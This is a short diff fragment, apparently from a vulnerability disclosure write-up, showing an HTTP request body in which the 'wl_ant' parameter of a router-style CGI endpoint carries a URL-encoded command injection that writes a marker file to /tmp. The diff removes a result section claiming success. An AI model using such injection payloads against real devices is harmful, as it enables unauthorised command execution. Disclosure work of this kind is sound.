@@ -23,8 +23,3 @@ Connection: keep-alive
 need_reboot=1&commit=1&need_action=1&nvset_cgi=1&StartEPI=1&wl_ant=%3Becho%20%22hacker_payload%22%20%3E%20%2Ftmp%2Fc10uds%3B%23s
 ```
 
-
-
-# result
-I successfully touch a file with the content "hacker_payload"
-![alt text](imgs/image.png)
